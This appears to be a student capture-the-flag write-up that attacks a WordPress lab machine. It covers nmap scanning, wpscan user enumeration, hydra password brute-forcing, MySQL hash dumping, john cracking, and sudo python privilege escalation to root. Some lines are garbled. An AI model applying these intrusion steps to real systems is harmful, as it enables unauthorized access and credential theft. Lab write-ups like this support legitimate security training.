# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services

![nmapsvos](https://github.com/iastoneCO/Final-Project/blob/93cd4e2d67f8a5769c9543e4f8ace71df13504d0/Images/nmap-sv-os-110.png)

Nmap scan results for each machine reveal the below services and OS details:  

$ nmap -sV -O 192.168.1.110 
-- (The -O detection the operating system, and -sV a detailed study of ports to determine the version of services.)
           
- Target 1  
       Open Ports:
    - Port 22 (SSH)
    - Port 80 (HTTP)
    - Port 111 (rpcbind)
    - Port 139 (netbis Samba)
    - Port 445 (netbis Samba)

### The following vulnerabilities were identified on each target:
     - Critical and Vulnerabilities

- Target 1
  - Run wpscan enumerate username for on the target1 system. 
  - wpscan ![wpscan-username](https://github.com/iastoneCO/Final-Project/blob/93cd4e2d67f8a5769c9543e4f8ace71df13504d0/Images/wpscan-enumerate-usernames.png)

  - Run hydra and found michael's password. His      password is vulnerabilities. His password is incredibly weak same his username. 
  *** He would be a password with a minim of 8 characters, including uppercase, lowercase and special characters.

    ![michael-password](https://github.com/iastoneCO/Final-Project/blob/93cd4e2d67f8a5769c9543e4f8ace71df13504d0/Images/michael-password.png)

   -- python  (user steven to run python with sudo.)
   -- Database mysql wp_config.php
   -- Access the mysql database use for the site, password hashes and other confidential information. 

CVE-2013-0235 | vulnerabilities - 
CVE-2013-0235 | vulnerabilities - [CVE-pages](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2013-0235/)


### Exploitation
would be a password with a minimum of 8 characters, including uppercase,  lowercase and special characters.
The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
 
- Target 1 

  -----Flag1
    - **Exploit Used**

      * Commands run: 
         - ssh username michael with Password. 
         - Open Port is 22 and run ssh    michael@192.168.1.110
         - cd /var/www/html
         - grep -ER flag1  
         - `flag1.txt`: flag1{b9bbcb33e11b80be759c4e844862482d}
         
      ![flag1](https://github.com/iastoneCO/Final-Project/blob/93cd4e2d67f8a5769c9543e4f8ace71df13504d0/Images/grep-found-flag1.png)     

  -----Flag2 
   - **Exploit Used**
     - Commands run: 
          -  cd /var/www/
          - cat flag2.txt
          - `flag2.txt`: flag2{fc3fd58dcdad9ab23faca6e9a36e581c}
 
      ![flag2](https://github.com/iastoneCO/Final-Project/blob/93cd4e2d67f8a5769c9543e4f8ace71df13504d0/Images/cat-flag2.txt.png)

  -----Flag3
   - **Exploit Used**
     - Use the mysql database
       - Commands Run:
         - still on ssh michael@192.168.1.110 
         - cd /var/www/html/wp_config.php (Found to connect to the mysql database and got the password.)
        - Mysql 
         - looked - show database, use wordpress, show tables, desc wp_posts
         - mysql - select post_title, post_content from wp_posts where post_title like "flag%"; 
         - found flag3 and flag4
         - flag3{afc01ab56b50591e7dccf93122770cd2}
         - found wp_users michael and steven included hash.

      ![flag3](https://github.com/iastoneCO/Final-Project/blob/93cd4e2d67f8a5769c9543e4f8ace71df13504d0/Images/flag3-from-wp_posts.png)


      ![hash](https://github.com/iastoneCO/Final-Project/blob/93cd4e2d67f8a5769c9543e4f8ace71df13504d0/Images/show-select-wp_users_hash-wordpress.png)  


  -----Flag4
   - **Exploit Used**
      - Commands run: python with sudo.
        - Copied/Pasted hash the wp_hash.txt
        - run john /root/Document/wp_hash.txt
        -Allow me to use python sudo to execute a shell program to access the root steven's account. 
        - cd /root directory and found flag4.txt
        - sudo python -c 'import pty;pty.spawn("bin/bash");' 
        - cat flag4.txt
        flag4{715dea6c055b9fe3337544932f2941ce}

    ![tables-wp_posts](https://github.com/iastoneCO/Final-Project/blob/6755c9e686222fefdf8dce51d59fefa13e2996b7/Images/raven-steven-found-cat-flag4-file.png)  
